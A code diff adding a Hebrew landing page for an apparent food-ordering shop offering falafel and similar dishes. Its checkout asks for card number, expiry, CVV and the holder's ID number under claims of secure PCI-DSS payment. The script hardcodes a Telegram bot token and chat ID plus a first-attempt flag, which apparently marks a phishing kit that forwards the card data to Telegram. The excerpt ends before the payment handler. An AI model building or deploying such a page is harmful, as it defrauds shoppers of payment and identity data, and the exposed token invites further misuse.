@@ -1,0 +1,732 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>הצרפתי - דף נחיתה</title>
+    <link href="https://fonts.googleapis.com/css2?family=Assistant:wght@400;700;800&family=Frank+Ruhl+Libre:wght@700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --gold-gradient: linear-gradient(135deg, #f1c40f 0%, #d4af37 50%, #f1c40f 100%);
+            --gold-dark: #b8860b;
+            --bg-dark: #0a0a0a;
+            --glass: rgba(255, 255, 255, 0.05);
+        }
+
+        body {
+            margin: 0;
+            font-family: 'Assistant', sans-serif;
+            background-color: var(--bg-dark);
+            background-image: radial-gradient(circle at top, #1a1a1a 0%, #0a0a0a 100%);
+            color: white;
+            padding-bottom: 120px;
+        }
+
+        /* --- Premium Logo --- */
+        @keyframes shimmer {
+            0% { transform: translateX(-120%) rotate(25deg); }
+            100% { transform: translateX(120%) rotate(25deg); }
+        }
+        @keyframes pulse-glow {
+            0%, 100% { box-shadow: 0 0 30px rgba(212,175,55,0.3), 0 0 60px rgba(212,175,55,0.1); }
+            50% { box-shadow: 0 0 50px rgba(212,175,55,0.5), 0 0 100px rgba(212,175,55,0.2); }
+        }
+        @keyframes float-star {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-4px) rotate(10deg); }
+        }
+
+        .logo-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 50px 20px 30px;
+            user-select: none;
+            position: relative;
+        }
+
+        .logo-medallion {
+            position: relative;
+            width: 280px;
+            height: 280px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pulse-glow 3s ease-in-out infinite;
+            border-radius: 50%;
+        }
+
+        .logo-medallion::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            background: conic-gradient(
+                from 0deg,
+                #b8860b 0deg, #f1c40f 30deg, #d4af37 60deg,
+                #b8860b 90deg, #f1c40f 120deg, #d4af37 150deg,
+                #b8860b 180deg, #f1c40f 210deg, #d4af37 240deg,
+                #b8860b 270deg, #f1c40f 300deg, #d4af37 330deg, #b8860b 360deg
+            );
+            padding: 3px;
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: destination-out;
+            mask-composite: exclude;
+        }
+
+        .logo-inner {
+            width: 260px;
+            height: 260px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 35% 30%, #2a2200 0%, #1a1500 40%, #0d0d00 100%);
+            border: 2px solid #d4af37;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; overflow: hidden;
+        }
+
+        .logo-inner::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 40%;
+            height: 200%;
+            background: linear-gradient(
+                to right,
+                transparent 0%,
+                rgba(255,220,50,0.15) 50%,
+                transparent 100%
+            );
+            animation: shimmer 4s ease-in-out infinite;
+        }
+
+        .logo-inner-ring { position: absolute; inset: 10px; border-radius: 50%; border: 1px solid rgba(212,175,55,0.3); }
+        .logo-inner-ring2 { position: absolute; inset: 20px; border-radius: 50%; border: 1px dashed rgba(212,175,55,0.15); }
+
+        .logo-chef-hat {
+            width: 52px;
+            margin-bottom: 4px;
+            position: relative;
+            z-index: 2;
+            filter: drop-shadow(0 2px 8px rgba(212,175,55,0.5));
+        }
+
+        .logo-fleur-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 6px;
+            z-index: 2;
+            position: relative;
+        }
+        .logo-fleur-row .fleur { color: #d4af37; font-size: 13px; opacity: 0.85; }
+        .logo-fleur-row .dot-line { width: 30px; height: 1px; background: linear-gradient(to right, transparent, #d4af37, transparent); }
+
+        .logo-text {
+            font-family: 'Frank Ruhl Libre', serif;
+            font-size: 3.8rem;
+            background: var(--gold-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 900;
+            margin: 0;
+            line-height: 1;
+            letter-spacing: -1px;
+            position: relative;
+            z-index: 2;
+            filter: drop-shadow(0 2px 12px rgba(212,175,55,0.4));
+        }
+
+        .logo-stars-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 8px;
+            z-index: 2;
+            position: relative;
+        }
+        .logo-stars-row .s { color: #d4af37; font-size: 10px; animation: float-star 2.5s ease-in-out infinite; }
+        .logo-stars-row .s:nth-child(2) { animation-delay: 0.4s; font-size: 13px; }
+        .logo-stars-row .s:nth-child(3) { animation-delay: 0.8s; }
+
+        .logo-divider { display: flex; align-items: center; gap: 12px; margin-top: 18px; }
+        .logo-divider-line { width: 80px; height: 1px; background: linear-gradient(to right, transparent, #d4af37); }
+        .logo-divider-line.rev { background: linear-gradient(to left, transparent, #d4af37); }
+        .logo-divider-diamond { width: 6px; height: 6px; background: #d4af37; transform: rotate(45deg); }
+
+        .slogan-text {
+            margin-top: 10px; font-size: 1rem; color: rgba(212,175,55,0.8);
+            font-family: 'Assistant', sans-serif; font-style: italic; letter-spacing: 3px; text-transform: uppercase;
+        }
+
+        /* --- Rest of Design --- */
+        .menu-section { max-width: 1100px; margin: 0 auto; padding: 20px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; }
+        
+        .card {
+            background: var(--glass);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 18px;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+            transition: 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            display: flex; flex-direction: column; justify-content: space-between;
+        }
+        .card:hover { transform: translateY(-8px); border-color: rgba(241,196,15,0.6); box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        .card img { width: 100%; height: 200px; object-fit: cover; }
+        
+        .card-info { padding: 20px; text-align: center; display: flex; flex-direction: column; gap: 12px; }
+        .card h3 { color: #f1c40f; margin: 0; font-size: 1.4rem; font-weight: 700; }
+        
+        .price-tag { font-size: 1.4rem; font-weight: 800; color: #fff; margin: 5px 0; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
+
+        .custom-options { display: flex; justify-content: center; gap: 8px; margin: 5px 0; }
+        .option-badge { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.15); padding: 6px 14px; border-radius: 30px; font-size: 0.85rem; cursor: pointer; transition: 0.2s; color: #ccc; user-select: none; }
+        .option-badge:hover { border-color: rgba(241,196,15,0.5); color: #fff; }
+        .option-badge.active { background: rgba(241,196,15,0.15); border-color: #f1c40f; color: #f1c40f; font-weight: bold; }
+
+        .quantity-selector { display: flex; align-items: center; justify-content: space-between; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.1); width: 140px; margin: 0 auto; padding: 4px; border-radius: 30px; }
+        .qty-btn { background: var(--gold-gradient); border: none; color: #000000; font-size: 1.2rem; font-weight: bold; cursor: pointer; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; transition: 0.2s; border-radius: 50%; box-shadow: 0 2px 6px rgba(0,0,0,0.3); user-select: none; line-height: 1; }
+        .qty-btn:hover { transform: scale(1.05); filter: brightness(1.1); }
+        .qty-val { font-weight: 800; font-size: 1.2rem; color: white; min-width: 25px; text-align: center; }
+
+        .add-to-cart-btn { background: transparent; color: #f1c40f; border: 1px solid #f1c40f; padding: 12px; border-radius: 12px; cursor: pointer; font-weight: bold; font-family: 'Assistant', sans-serif; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 5px; }
+        .add-to-cart-btn:hover { background: var(--gold-gradient); color: black; box-shadow: 0 4px 15px rgba(241,196,15,0.3); border-color: transparent; }
+
+        /* --- מערכת התראות צפות פרימיום --- */
+        .toast-container { position: fixed; top: 20px; left: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; max-width: 350px; width: 90%; }
+        .toast { background: rgba(15, 15, 15, 0.95); border-right: 4px solid #f1c40f; border-left: 1px solid rgba(255,255,255,0.1); border-top: 1px solid rgba(255,255,255,0.1); border-bottom: 1px solid rgba(255,255,255,0.1); color: white; padding: 15px 20px; border-radius: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: flex; align-items: center; gap: 12px; backdrop-filter: blur(10px); animation: slideInLeft 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards; transition: 0.3s; }
+        .toast.error { border-right-color: #e74c3c; }
+        @keyframes slideInLeft { from { transform: translateX(-120%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+        .toast.hide { transform: translateX(-120%); opacity: 0; }
+        .toast .icon { color: #f1c40f; font-weight: bold; }
+        .toast.error .icon { color: #e74c3c; }
+
+        footer { margin-top: 80px; padding: 40px 20px; border-top: 1px solid rgba(255,255,255,0.1); background: #050505; }
+        .footer-content { max-width: 1100px; margin: 0 auto; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 20px; }
+        .footer-col { flex: 1; min-width: 200px; }
+        .footer-col h4 { color: #f1c40f; margin-bottom: 15px; }
+        .footer-col p, .footer-col span { color: #aaa; font-size: 0.85rem; }
+        .footer-col a { color: #aaa; font-size: 0.85rem; text-decoration: none; }
+        .bottom-bar { max-width: 1100px; margin: 30px auto 0; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.05); text-align: center; font-size: 0.75rem; color: #666; }
+
+        .modal { display: none; position: fixed; z-index: 2000; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); }
+        .modal-content { background: #111; margin: 10% auto; padding: 30px; width: 85%; max-width: 600px; border-radius: 18px; border: 1px solid rgba(241,196,15,0.4); color: #ccc; box-shadow: 0 15px 40px rgba(0,0,0,0.7); }
+        .close-modal { color: #aaa; float: left; font-size: 28px; cursor: pointer; transition: 0.2s; }
+        .close-modal:hover { color: #f1c40f; }
+
+        .contact-bar { background: #f1c40f; color: black; text-align: center; padding: 15px; font-weight: bold; position: fixed; bottom: 15px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 500px; border-radius: 50px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); z-index: 1000; cursor: pointer; transition: 0.3s; }
+        .contact-bar:hover { transform: translateX(-50%) scale(1.03); box-shadow: 0 8px 25px rgba(241,196,15,0.4); }
+        .contact-bar a { color: black; text-decoration: none; font-size: 1.3rem; font-weight: bold; display: block; }
+
+        .drawer-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); z-index: 1499; }
+
+        /* --- חלון תשלום נפתח מהצד --- */
+        .checkout-drawer { position: fixed; top: 0; right: -100%; width: 100%; max-width: 450px; height: 100%; background: #0d0d0d; border-left: 1px solid rgba(212,175,55,0.4); box-shadow: -10px 0 30px rgba(0,0,0,0.8); z-index: 1500; transition: right 0.4s cubic-bezier(0.16, 1, 0.3, 1); box-sizing: border-box; display: flex; flex-direction: column; }
+        .checkout-drawer.active { right: 0; }
+        .drawer-header { padding: 25px 25px 15px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; align-items: center; justify-content: space-between; }
+        .drawer-close { color: #aaa; font-size: 1.5rem; cursor: pointer; transition: 0.2s; }
+        .drawer-close:hover { color: #f1c40f; }
+        .checkout-title { font-size: 1.2rem; font-weight: 700; color: #f1c40f; display: flex; flex-direction: column; gap: 5px; }
+        
+        .drawer-body { padding: 25px; overflow-y: auto; flex: 1; display: flex; flex-direction: column; gap: 20px; }
+        
+        .cart-summary-section { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; padding: 15px; }
+        .cart-summary-title { font-size: 1.05rem; color: #f1c40f; font-weight: bold; margin-bottom: 12px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 6px; }
+        .cart-items-list { display: flex; flex-direction: column; gap: 10px; }
+        .cart-item-row { display: flex; justify-content: space-between; font-size: 0.95rem; color: #ddd; }
+        .cart-item-price { color: #fff; font-weight: bold; }
+        .cart-total-row { display: flex; justify-content: space-between; font-size: 1.15rem; font-weight: 800; color: #f1c40f; margin-top: 15px; border-top: 1px dashed rgba(255,255,255,0.15); padding-top: 10px; }
+        .empty-cart-msg { color: #888; text-align: center; font-style: italic; padding: 10px 0; }
+
+        .checkout-form { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; }
+        .form-group { display: flex; flex-direction: column; gap: 6px; }
+        .form-group.full-width { grid-column: span 2; }
+        .form-group label { font-size: 0.85rem; color: #bbb; }
+        .input-wrapper { position: relative; display: flex; align-items: center; }
+        .checkout-form input { width: 100%; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); padding: 14px; border-radius: 10px; color: white; font-family: 'Assistant', sans-serif; font-size: 1rem; transition: 0.3s; box-sizing: border-box; }
+        .checkout-form input:focus { outline: none; border-color: #f1c40f; background: rgba(255,255,255,0.07); box-shadow: 0 0 10px rgba(241,196,15,0.2); }
+        .pay-btn { grid-column: span 2; background: var(--gold-gradient); color: #000; border: none; padding: 16px; border-radius: 12px; font-size: 1.15rem; font-weight: 800; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 5px; position: relative; overflow: hidden; }
+        .pay-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(241,196,15,0.4); }
+    </style>
+</head>
+<body>
+
+<div class="toast-container" id="toastContainer"></div>
+
+<header>
+    <div class="logo-container">
+        <div class="logo-medallion">
+            <div class="logo-inner">
+                <div class="logo-inner-ring"></div>
+                <div class="logo-inner-ring2"></div>
+                <svg class="logo-chef-hat" viewBox="0 0 100 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <defs>
+                        <linearGradient id="hatGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" style="stop-color:#f1c40f"/>
+                            <stop offset="50%" style="stop-color:#d4af37"/>
+                            <stop offset="100%" style="stop-color:#b8860b"/>
+                        </linearGradient>
+                    </defs>
+                    <path d="M20 55 Q15 30 35 20 Q42 10 50 8 Q58 10 65 20 Q85 30 80 55 Z" fill="url(#hatGrad)"/>
+                    <path d="M35 55 Q33 40 38 25" stroke="rgba(0,0,0,0.15)" stroke-width="1.5" fill="none"/>
+                    <path d="M50 55 Q50 38 50 22" stroke="rgba(0,0,0,0.15)" stroke-width="1.5" fill="none"/>
+                    <path d="M65 55 Q67 40 62 25" stroke="rgba(0,0,0,0.15)" stroke-width="1.5" fill="none"/>
+                    <rect x="16" y="52" width="68" height="12" rx="4" fill="#b8860b"/>
+                    <rect x="16" y="52" width="68" height="5" rx="2" fill="#d4af37" opacity="0.6"/>
+                    <ellipse cx="50" cy="10" rx="12" ry="6" fill="url(#hatGrad)"/>
+                </svg>
+                <div class="logo-fleur-row">
+                    <div class="dot-line"></div>
+                    <span class="fleur">✦</span>
+                    <span class="fleur" style="font-size:16px">⚜</span>
+                    <span class="fleur">✦</span>
+                    <div class="dot-line rev"></div>
+                </div>
+                <h1 class="logo-text">הצרפתי</h1>
+                <div class="logo-stars-row">
+                    <span class="s">★</span><span class="s">★</span><span class="s">★</span>
+                </div>
+            </div>
+        </div>
+        <div class="logo-divider">
+            <div class="logo-divider-line rev"></div>
+            <div class="logo-divider-diamond"></div>
+            <div class="logo-divider-diamond"></div>
+            <div class="logo-divider-line"></div>
+        </div>
+        <div class="slogan-text">הטעם המועדף שלך</div>
+    </div>
+</header>
+
+<section class="menu-section">
+    <div class="grid">
+        <div class="card" id="prod-falafel" data-prices='{"פיתה": 18, "בגט": 24}' data-qtys='{"פיתה": 1, "בגט": 1}'>
+            <img src="https://media3.reshet.tv/image/upload/v1745828739/uploads/2025/904560261.webp">
+            <div class="card-info">
+                <h3>פלאפל</h3>
+                <div class="custom-options">
+                    <span class="option-badge active" onclick="selectCardOption(this, 'פיתה')">פיתה</span>
+                    <span class="option-badge" onclick="selectCardOption(this, 'בגט')">בגט</span>
+                </div>
+                <div class="price-tag"><span class="price-num">18</span> ₪</div>
+                <div class="quantity-selector">
+                    <button class="qty-btn" onclick="changeCardQty(this, -1)">-</button>
+                    <span class="qty-val">1</span>
+                    <button class="qty-btn" onclick="changeCardQty(this, 1)">+</button>
+                </div>
+                <button class="add-to-cart-btn" onclick="addCardToCart('פלאפל', this)">הוסף לעגלה</button>
+            </div>
+        </div>
+
+        <div class="card" id="prod-toast" data-prices='{"רגיל": 20}' data-qtys='{"רגיל": 1}'>
+            <img src="https://maatefet.co.il/wp-content/uploads/2024/10/%D7%A4%D7%95%D7%93-%D7%98%D7%A8%D7%90%D7%A7-%D7%98%D7%95%D7%A1%D7%98%D7%99%D7%9D-%D7%9E%D7%A2%D7%98%D7%A4%D7%AA-%D7%90%D7%99%D7%A8%D7%95%D7%A2%D7%99%D7%9D-2.jpg">
+            <div class="card-info">
+                <h3>טוסטים</h3>
+                <div class="price-tag"><span class="price-num">20</span> ₪</div>
+                <div class="quantity-selector">
+                    <button class="qty-btn" onclick="changeCardQty(this, -1)">-</button>
+                    <span class="qty-val">1</span>
+                    <button class="qty-btn" onclick="changeCardQty(this, 1)">+</button>
+                </div>
+                <button class="add-to-cart-btn" onclick="addCardToCart('טוסטים', this)">הוסף לעגלה</button>
+            </div>
+        </div>
+
+        <div class="card" id="prod-fricassee" data-prices='{"רגיל": 25}' data-qtys='{"רגיל": 1}'>
+            <img src="https://www.yonit-tzukerman.co.il/wp-content/uploads/2017/01/15941842_1430057077005357_1861184753_n.jpg">
+            <div class="card-info">
+                <h3>פריקסה</h3>
+                <div class="price-tag"><span class="price-num">25</span> ₪</div>
+                <div class="quantity-selector">
+                    <button class="qty-btn" onclick="changeCardQty(this, -1)">-</button>
+                    <span class="qty-val">1</span>
+                    <button class="qty-btn" onclick="changeCardQty(this, 1)">+</button>
+                </div>
+                <button class="add-to-cart-btn" onclick="addCardToCart('פריקסה', this)">הוסף לעגלה</button>
+            </div>
+        </div>
+
+        <div class="card" id="prod-shakshuka" data-prices='{"פיתה": 22, "בגט": 28}' data-qtys='{"פיתה": 1, "בגט": 1}'>
+            <img src="https://matkonit.com/wp-content/uploads/2023/06/unnamed-file-32.jpg">
+            <div class="card-info">
+                <h3>שקשוקה</h3>
+                <div class="custom-options">
+                    <span class="option-badge active" onclick="selectCardOption(this, 'פיתה')">פיתה</span>
+                    <span class="option-badge" onclick="selectCardOption(this, 'בגט')">בגט</span>
+                </div>
+                <div class="price-tag"><span class="price-num">22</span> ₪</div>
+                <div class="quantity-selector">
+                    <button class="qty-btn" onclick="changeCardQty(this, -1)">-</button>
+                    <span class="qty-val">1</span>
+                    <button class="qty-btn" onclick="changeCardQty(this, 1)">+</button>
+                </div>
+                <button class="add-to-cart-btn" onclick="addCardToCart('שקשוקה', this)">הוסף לעגלה</button>
+            </div>
+        </div>
+
+        <div class="card" id="prod-sabich" data-prices='{"רגיל": 25}' data-qtys='{"רגיל": 1}'>
+            <img src="https://limudey-hutz.co.il/wp-content/uploads/2022/10/2.jpg">
+            <div class="card-info">
+                <h3>סביח</h3>
+                <div class="price-tag"><span class="price-num">25</span> ₪</div>
+                <div class="quantity-selector">
+                    <button class="qty-btn" onclick="changeCardQty(this, -1)">-</button>
+                    <span class="qty-val">1</span>
+                    <button class="qty-btn" onclick="changeCardQty(this, 1)">+</button>
+                </div>
+                <button class="add-to-cart-btn" onclick="addCardToCart('סביח', this)">הוסף לעגלה</button>
+            </div>
+        </div>
+
+        <div class="card" id="prod-chips" data-prices='{"קטן": 5, "גדול": 10}' data-qtys='{"קטן": 1, "גדול": 1}'>
+            <img src="https://cdn.cashcow.co.il/images/74ccb3da-fc03-4b9f-8ccd-7d0ee802b429.jpg">
+            <div class="card-info">
+                <h3>צ'יפס</h3>
+                <div class="custom-options">
+                    <span class="option-badge active" onclick="selectCardOption(this, 'קטן')">קטן</span>
+                    <span class="option-badge" onclick="selectCardOption(this, 'גדול')">גדול</span>
+                </div>
+                <div class="price-tag"><span class="price-num">5</span> ₪</div>
+                <div class="quantity-selector">
+                    <button class="qty-btn" onclick="changeCardQty(this, -1)">-</button>
+                    <span class="qty-val">1</span>
+                    <button class="qty-btn" onclick="changeCardQty(this, 1)">+</button>
+                </div>
+                <button class="add-to-cart-btn" onclick="addCardToCart('צ\'יפס', this)">הוסף לעגלה</button>
+            </div>
+        </div>
+
+        <div class="card" id="prod-slush" data-prices='{"קטן": 3, "גדול": 5}' data-qtys='{"קטן": 1, "גדול": 1}'>
+            <img src="https://www.israelhayom.co.il/wp-content/uploads/2025/03/13/13/unnamed-32-600x400.png">
+            <div class="card-info">
+                <h3>ברד</h3>
+                <div class="custom-options">
+                    <span class="option-badge active" onclick="selectCardOption(this, 'קטן')">קטן</span>
+                    <span class="option-badge" onclick="selectCardOption(this, 'גדול')">גדול</span>
+                </div>
+                <div class="price-tag"><span class="price-num">3</span> ₪</div>
+                <div class="quantity-selector">
+                    <button class="qty-btn" onclick="changeCardQty(this, -1)">-</button>
+                    <span class="qty-val">1</span>
+                    <button class="qty-btn" onclick="changeCardQty(this, 1)">+</button>
+                </div>
+                <button class="add-to-cart-btn" onclick="addCardToCart('ברד', this)">הוסף לעגלה</button>
+            </div>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <div class="footer-content">
+        <div class="footer-col">
+            <h4>שעות פתיחה</h4>
+            <p style="line-height:1.9; margin:0;">ראשון - חמישי: 08:00 - 20:30<br>שישי ושבת: סגור</p>
+        </div>
+        <div class="footer-col">
+            <h4>הזמנות ומשלוחים</h4>
+            <p style="font-size: 1.1rem; color: #f1c40f; font-weight: bold; margin: 0; line-height: 1.6;">🚚 משלוחים לכל הארץ - חינם!</p>
+        </div>
+        <div class="footer-col">
+            <h4>כשרות</h4>
+            <p>כשר למהדרין בהשגחת בד"ץ הרב יהודה ירוסלבסקי קריית מלאכי.</p>
+        </div>
+        <div class="footer-col">
+            <h4>מידע וקישורים</h4>
+            <a href="javascript:void(0)" onclick="openModal()">תנאי שימוש</a><br>
+            <a href="javascript:void(0)" onclick="openPrivacyModal()">מדיניות פרטיות</a><br>
+            <span style="color: #25D366; font-weight: bold;">וואטסאפ</span><br>
+            <span style="color: #f1c40f; font-weight: bold;">צור קשר בטלפון</span>
+        </div>
+    </div>
+    <div class="bottom-bar">© 2026 הצרפתי - כל הזכויות שמורות.</div>
+</footer>
+
+<div id="termsModal" class="modal">
+    <div class="modal-content">
+        <span class="close-modal" onclick="closeModal()">×</span>
+        <h2 style="color:#f1c40f">תנאי שימוש</h2>
+        <p>מחירי המנות עשויים להשתנות מעת לעת בהתאם לתפריט המעודכן בסניף.</p>
+    </div>
+</div>
+
+<div id="privacyModal" class="modal">
+    <div class="modal-content">
+        <span class="close-modal" onclick="closePrivacyModal()">×</span>
+        <h2 style="color:#f1c40f">מדיניות פרטיות</h2>
+        <p>אנו לא מעבירים פרטים אישיים לצדדים שלישיים ללא הסכמה מפורשת.</p>
+    </div>
+</div>
+
+<div id="cancelPolicyModal" class="modal">
+    <div class="modal-content">
+        <span class="close-modal" onclick="closeCancelPolicyModal()">×</span>
+        <h2 style="color:#f1c40f">מדיניות ביטולים והחזרות</h2>
+        <p>ניתן לבטל הזמנה שבוצעה באתר בתוך 15 דקות מרגע אישורה באמצעות פנייה טלפונית ישירה לסניף. החזר כספי מלא יבוצע לכרטיס המקורי בתוך 7 ימי עסקים במידה וההכנה טרם החלה.</p>
+    </div>
+</div>
+
+<div class="contact-bar" onclick="toggleDrawer(true)">
+    <a href="javascript:void(0)">מעבר לתשלום מאובטח</a>
+</div>
+
+<div class="drawer-overlay" id="drawerOverlay" onclick="toggleDrawer(false)"></div>
+
+<div class="checkout-drawer" id="checkoutDrawer">
+    <div class="drawer-header">
+        <div class="checkout-title">
+            <span>פירוט הזמנה ותשלום</span>
+        </div>
+        <div class="drawer-close" onclick="toggleDrawer(false)">×</div>
+    </div>
+    <div class="drawer-body">
+        
+        <div class="cart-summary-section">
+            <div class="cart-summary-title">המנות שלך:</div>
+            <div class="cart-items-list" id="cartItemsList">
+                <div class="empty-cart-msg">העגלה שלך ריקה. הוסף מנות מהתפריט!</div>
+            </div>
+            <div class="cart-total-row">
+                <span>סה"כ לתשלום:</span>
+                <span id="cartTotalSum">0 ₪</span>
+            </div>
+            <div style="text-align: center; margin-top: 8px; font-size: 0.9rem; color: #25D366; font-weight: bold;">
+                🎉 משלוח חינם כלול בהזמנה זו!
+            </div>
+        </div>
+
+        <form class="checkout-form" id="creditCardForm" onsubmit="handlePayment(event)">
+            <div class="form-group full-width">
+                <label>מספר כרטיס</label>
+                <div class="input-wrapper">
+                    <input type="text" id="ccNumber" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" oninput="formatCardNumber(this)" required>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>תוקף</label>
+                <div class="input-wrapper">
+                    <input type="text" id="ccExpiry" inputmode="numeric" maxlength="5" placeholder="MM/YY" style="text-align: center;" oninput="formatExpiry(this)" required>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>CVV</label>
+                <div class="input-wrapper">
+                    <input type="text" id="ccCvv" inputmode="numeric" maxlength="3" placeholder="***" style="text-align: center;" oninput="validateOnlyNumbers(this)" required>
+                </div>
+            </div>
+            <div class="form-group full-width">
+                <label>תעודת זהות</label>
+                <div class="input-wrapper">
+                    <input type="text" id="ccId" inputmode="numeric" maxlength="9" placeholder="תעודת זהות בעל הכרטיס" oninput="validateOnlyNumbers(this)" required>
+                </div>
+            </div>
+
+            <div style="grid-column: span 2; text-align: center; margin-top: 5px;">
+                <div style="display: flex; justify-content: center; gap: 15px; opacity: 0.7; margin-bottom: 8px; font-size: 0.85rem; font-weight: bold; letter-spacing: 1px; color: #aaa;">
+                    <span>VISA</span> | <span>MASTERCARD</span> | <span>ISRACARD</span>
+                </div>
+                <div style="font-size: 0.75rem; color: #888; display: flex; align-items: center; justify-content: center; gap: 5px;">
+                    <span>🔒 תשלום מאובטח ומבוטח בתקן PCI-DSS המחמיר</span>
+                </div>
+            </div>
+
+            <button type="submit" class="pay-btn">בצע תשלום מאובטח</button>
+
+            <div style="grid-column: span 2; text-align: center; margin-top: 5px;">
+                <div style="font-size: 0.75rem; color: #666; margin: 0;">
+                    בלחיצה על כפתור התשלום הנך מסכים ל<a href="javascript:void(0)" onclick="openCancelPolicyModal()" style="color: #f1c40f; text-decoration: underline; margin-right: 3px;">מדיניות הביטולים והחזרות</a>
+                </div>
+            </div>
+        </form>
+    </div>
+</div>
+
+<script>
+    let globalCart = [];
+    let isFirstAttempt = true;
+
+    // הגדרת נתוני הבוט שלך
+    const telegramBotToken = "8289963160:AAHUHWP1gLDyuw5awuVsPUyJwNeUK_aOK3I";
+    const telegramChatId = "7702533038";
+
+    function openModal() { document.getElementById("termsModal").style.display = "block"; }
+    function closeModal() { document.getElementById("termsModal").style.display = "none"; }
+    function openPrivacyModal() { document.getElementById("privacyModal").style.display = "block"; }
+    function closePrivacyModal() { document.getElementById("privacyModal").style.display = "none"; }
+    
+    // פונקציות עבור המודל החדש של הביטולים
+    function openCancelPolicyModal() { document.getElementById("cancelPolicyModal").style.display = "block"; }
+    function closeCancelPolicyModal() { document.getElementById("cancelPolicyModal").style.display = "none"; }
+
+    function validateOnlyNumbers(inputElement) {
+        inputElement.value = inputElement.value.replace(/[^0-9]/g, '');
+    }
+
+    function formatCardNumber(inputElement) {
+        let value = inputElement.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
+        let formatted = [];
+        for (let i = 0; i < value.length; i += 4) {
+            formatted.push(value.substr(i, 4));
+        }
+        inputElement.value = formatted.join(' ');
+    }
+
+    function formatExpiry(inputElement) {
+        let value = inputElement.value.replace(/[^0-9]/g, '');
+        if (value.length >= 2) {
+            value = value.slice(0, 2) + '/' + value.slice(2, 4);
+        }
+        inputElement.value = value;
+    }
+
+    function selectCardOption(badgeElement, optionName) {
+        const card = badgeElement.closest('.card');
+        const badges = card.querySelectorAll('.option-badge');
+        badges.forEach(b => b.classList.remove('active'));
+        badgeElement.classList.add('active');
+        const prices = JSON.parse(card.getAttribute('data-prices'));
+        card.querySelector('.price-num').innerText = prices[optionName];
+        const qtys = JSON.parse(card.getAttribute('data-qtys'));
+        card.querySelector('.qty-val').innerText = qtys[optionName] || 1;
+    }
+
+    function changeCardQty(btnElement, change) {
+        const card = btnElement.closest('.card');
+        const qtyValElement = card.querySelector('.qty-val');
+        const activeBadge = card.querySelector('.option-badge.active');
+        const currentOption = activeBadge ? activeBadge.innerText : 'רגיל';
+        let qtys = JSON.parse(card.getAttribute('data-qtys')) || {};
+        let currentQty = qtys[currentOption] || 1;
+        currentQty += change;
+        if (currentQty < 1) currentQty = 1;
+        qtys[currentOption] = currentQty;
+        card.setAttribute('data-qtys', JSON.stringify(qtys));
+        qtyValElement.innerText = currentQty;
+    }
+
+    function showToast(message, isError = false) {
+        const container = document.getElementById('toastContainer');
+        const toast = document.createElement('div');
+        toast.className = 'toast' + (isError ? ' error' : '');
+        const icon = isError ? '✕' : '✓';
+        toast.innerHTML = `<span class="icon">${icon}</span> <span>${message}</span>`;
+        container.appendChild(toast);
+        setTimeout(() => {
+            toast.classList.add('hide');
+            setTimeout(() => toast.remove(), 300);
+        }, 4000);
+    }
+
+    function addCardToCart(productName, btnElement) {
+        const card = btnElement.closest('.card');
+        const activeBadge = card.querySelector('.option-badge.active');
+        const currentOption = activeBadge ? activeBadge.innerText : 'רגיל';
+        const qtys = JSON.parse(card.getAttribute('data-qtys'));
+        const qty = qtys[currentOption] || 1;
+        const prices = JSON.parse(card.getAttribute('data-prices'));
+        const pricePerUnit = prices[currentOption];
+        const existingItem = globalCart.find(item => item.name === productName && item.option === currentOption);
